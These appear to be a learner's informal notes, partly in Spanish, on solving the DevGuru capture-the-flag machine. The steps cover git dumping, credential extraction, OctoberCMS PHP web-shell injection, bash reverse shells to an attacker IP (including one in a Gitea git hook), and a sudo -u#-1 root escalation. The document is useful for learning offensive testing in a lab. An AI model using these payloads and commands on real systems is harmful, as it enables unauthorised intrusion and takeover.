geSkills

- Web Enumeration
- Extracting the contents of .git directory - GitDumper
- Extracting the contents of .git directory - GitExtractor
- Information Leakage
- Gaining access to a Adminer 4.7.7 panel

- Generating a new bcrypt hash for a user in order to gain access to OctoberCMS backend
- OctoberCMS Exploitation - Markup + PHP Code Injection
- Abusing Adminer to gain access to Gitea
- Abusing Git Hooks (pre-receive) - Code Execution (User Pivoting)
- Abusing sudoers privilege (ALL, !root) NOPASSWD + Sudo version (u#-1) in order to become root

Certifications

eWPT OSWE OSCP


In nmap there are different formats
oN
oG
xml and "a"

with locate .nse we can see al the scripts of nmap

```
locate .nse
```

And we can know the number of scripts

```
kali>locate .nse | wc -l 

606
```

So when we scann all, we look three opened ports 80,22,8585 

we see a server on the 80 port...

```
whatweb http://172.16.2.184
```
The result is this: 
```
http://172.16.2.184 [200 OK] Apache[2.4.29], Cookies[october_session], Country[RESERVED][ZZ], Email[support@devguru.loca,support@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[october_session], IP[172.16.2.184], MetaGenerator[DevGuru], Script, Title[Corp - DevGuru], X-UA-Compatible[IE=edge]
```

"october cms" Cookies[october_session] (on hack the box tehre is a machine with buffer overflow)

he suspect that here is a "virtual hosting working on because of this support@devguru.loca "


lauchpad: https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4


OpenSSH 7.6p1 4 (versions less than 7.7 are vulnerable to username enumeration)

ubuntu bionic

If for some reason we search the in the launchpad OpenSSH 7.6p1 4 and Apache version and there are different , we may know that docker is working here, or some other technology.


this is interesting ... .git 

****If we see on a machine a folder called ".git"
we can use "GITDUMPER tool"***

https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh


172.16.2.184:80/.git/

sometimes we can see the git repositorys

credentials, logs , and many information

if there is a php technology behind the machine, you can search something like


Adminer is a tool for administration of contents on databases (on wapalizer figues as "database managers")
http://172.16.2.184//adminer.php

this is for "october"
http://172.16.2.184/backend

Savitar knowed this two because he knew of another machines

we are going to see something with gobuster

gobuster dir -u http://http://172.16.2.184 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -x php

you can use another dictionaries


Now we are going to focus on this "git" repository, aparently it is important so we are going to use the dumper of the git tools. 

We are not going to use "git clone" because on this way we will get all the folder and we want only the dumper. With svn we can do this .

```
 svn checkout https://github.com/internetwache/GitTools/trunk/Dumper   
 ```

If we want to use this tool, we create a folder called project, and then we put all the info on that folder with this command

```
./gitdumper.sh http://192.168.100.77/.git/ ../project

```
This command ensures that we are composing the project well 
```
du -hc project
```
with this we ony watch the last line of the project

```
du -hc project | tail -n 1
```
we monitorize it every minute wit this
```
watch -n 1 'echo `du -hc project | tail -n 1`'
```
Please do this on the same folder that is executing the dumper 
![[Screenshot_2023-08-16_19_56_03.png]]



and with another tool (extractor) we give him the folder "project" and it rebuilds the project





while this is executing we are watching the port open, 8585 that have another http service running, is "gitea".. this is 

```
Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git, así como otras funciones de colaboración como el seguimiento de errores y los wikis. [Wikipedia](https://es.wikipedia.org/wiki/Gitea)
```

http://192.168.100.77:8585/


we can look on this website things, we can look for users, and other functionalities , and it have a log in. Savitar says that it is possible enumerate users with a exploit because the ssh is minor than 7.7. BUt... i remember that i cant do it with my machine... i dont know why.. because of.. paramiko.

But I found another one  https://github.com/epi052/cve-2018-15473/tree/master ssh-username-enum.py and the reason that doesnt work is this.

![[Screenshot_2023-08-16_20_20_14.png]]
so now it works
```
python3 ssh-username-enum.py -u root 192.168.100.77 
```
We found a user called "frank" that was on the "gitea" website.

www-data is a valid username to
```
python3 ssh-username-enum.py -u frank 192.168.100.77
[+] OpenSSH version 7.6 found
[+] frank found!

```

So we found a user, lets return to the git project that we were reconstructing. We are in the folder "project" and this is what we have:
```
──(cds㉿kali)-[~/…/pentesting/devguru/content/project]
└─$ ls -la
total 12
drwxr-xr-x 3 cds cds 4096 Aug 16 19:48 .
drwxr-xr-x 4 cds cds 4096 Aug 16 19:48 ..
drwxr-xr-x 6 cds cds 4096 Aug 16 19:48 .git
                                                     
┌──(cds㉿kali)-[~/…/pentesting/devguru/content/project]
└─$ git log
commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -> master)
Author: frank <frank@devguru.local>
Date:   Thu Nov 19 18:42:03 2020 -0600

    first commit
```


If you put: 
```
git log -p 7de9115700c5656c670b34987c6fbffd39d90cf2
```
you cannot see much, you cannot see the info structured as "directory, archives, etc" you cannot see it well.

When you have the project restored, you need to do another thing, you must use the Extractor tool.

```
svn checkout https://github.com/internetwache/GitTools/trunk/Extractor
```

So if you want to use it , do it like this. 
- 1 Execute the extractor
- 2 Give the folder to extract
- 3 Give a path where you put the project restored
```
./extractor.sh ../project ../fullProject    
```
And now we can see the content of the full project

![[Screenshot_2023-08-16_20_48_13.png]]


It is important to watch on the folder " config" when we have acces to a project

On the configuration folder, was an archive caled db or something, and we found this:

```
'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',

```



***TIP***
if you want to go to a folder without using ../ ../ ../ directly put  but you must download it from github
```
kali > cd `bd content`
```

we get the acces to the database  
http://192.168.100.77/adminer.php
with the credentials of october.

We can inject commands depending of our privileges and get  a interactive console, or read privileged info

```
login: frank
password: $2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK
email: [frank@devguru.local](mailto:frank@devguru.local)
```
So the password is in a hash he said that if we are using hashcat 

finding the type of hash with a reg exp

- starts with a "space"
- then starts with a $2
- then have a value .* <- something
- finish with a $ 
- -A 1 shows the first line (this is not necesary)
```
hashcat --example-hashes | grep '\s\$2.*\$' -A 1
```

This is the hash "blowfish"

```
 Name................: bcrypt $2*$, Blowfish (Unix)
  Category............: Operating System
```

Now he is saying that we have to make our own password hashed on google
"bcrypt hash generator", he is changing the password on the database

```
password123
$2a$12$mVmQcqh.jCH5BRlmXnFI9.1eKC82.QdWJsuSbG16Lnoa1mSGUHZMm
```

now we can log on 

http://192.168.100.77/backend/backend

as "frank"

THe important thing now is "win acces to the content generator or content gestor". So we can "tense" the things

Now if we want to insert code on the website we must put  in the 
| home | CMS |

we have a code (we can change the hello world):
```
function onStart()
{
    $this->page["myVar"] = "Hello World!";
}
```
We can change it for this

```
function onStart()
{
    $this->page["myVar"] = shell_exec($_GET['cmd']);
}
```


and a markup

```
{{ this.page.myVar }}
```

Now when I search a URL name I put this : 

"http://172.16.2.184/?cmd=whoami"

and i recive:

www-data

If you want to know that you're really on the machine of the target and youre not in a virtual hosting or something, you put this:

http://172.16.2.184/?cmd=hostname -i

and it's the same ip

```
172.16.2.184 fe80::a00:27ff:fedf:3e29
```

Now , of course if we can do this type of commands, we can try to get in to the machine remotely


bash -i means (interactive)
```
http://172.16.2.184/?cmd=bash -c "bash -i >& /dev/tcp/172.16.0.140/443 0>&1"
```
Now we're in

- script /dev/null -c bash
- stty raw -echo ;fg
- reset xterm
- export TERM=xterm
- export SHELL=bash


Ok I search on groups , I havent, sudo -l (i need a pass) and group priviledges I havent
and i have no  permissions (find / -perm 4000 2>/dev/null , and without root)

Savitar is searching the password of frank on 

on my pc :

```
find \-name database.php | batcat 
```

this is the file

```
./fullProject/0-7de9115700c5656c670b34987c6fbffd39d90cf2/config/database.php
```

we are going to try with the pass of october
it doesnt work

If we want to search for another valid users on the system we can find them like this

```
grep "shs" /etc/passwd
```

he said that we can compare on the  folder /var the existents archives that we reconstruct of the project git , with the existent files on the target machine

he says that on the backup folders sometimes we can find usefull info.

in the app.ini.bak he want to grep the comments of the file  ( he is deleting it)

```
app.ini.bak | grep -v "^;"
```
and the passowrds

-i ignores the case sensitive (takes all)
```
app.ini.bak | grep -v "^;" | grep -i pass
```

there is one ;
is from 
gitea
UfFPTF8C8jjxVF2m


we will do the same on the users table , changing the password of frank 


password123 (on bcrypt)
```
$2a$12$mVmQcqh.jCH5BRlmXnFI9.1eKC82.QdWJsuSbG16Lnoa1mSGUHZMm
```

this is the gitea repository of frank

frank is the production user, and gitea is executing on the server, we can see that frank is the user executing the task with

```
ps -faux | grep gitea
```

At this point if i can execute a command on this service on remote way from this platform gitea, i will be executing the command as a propietary on the local machine.

on the gitea website  put 
- settings
- git hooks


QUE SON GIT HOOKS ?
```
Los hooks de Git son **scripts que se ejecutan automáticamente cada vez que se produce un evento concreto en un repositorio de Git**. Permiten personalizar el comportamiento interno de Git y desencadenar acciones personalizables en puntos clave del ciclo de vida del desarrollo.

```

dice que los git hooks son similares a los  "apt updates" del sistema que tenes un pre invoke  y un post invoke. Podes controlar que accion queres que se ejecute a nivel de sistema 

We are going to modify the README.md
with just two gaps

we must modify the pre-recibe and post recive

![[Screenshot_2023-08-17_10_47_15.png]]
so on the pre recive we put this:

I think we get a bash as frank with this one , (when we update the commit  readme.md)
```
bash -i >&  /dev/tcp/172.16.0.140/443 0>&1
```

lets listen on nc -nlvp 777

so, with sudo -l we can execute this, this are our permissions

```
 (ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

gtfobins gives us this to execute a shell 

```
sqlite3 /dev/null '.shell /bin/sh'
```
but we still being frank

he is looking the version of "sudo"

#sudoversion
```
sudo --version 1.8.21
```
actually the version is maybe 2 1.9

so, we can make a command that permites us to be root, just with this 

```
sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
```




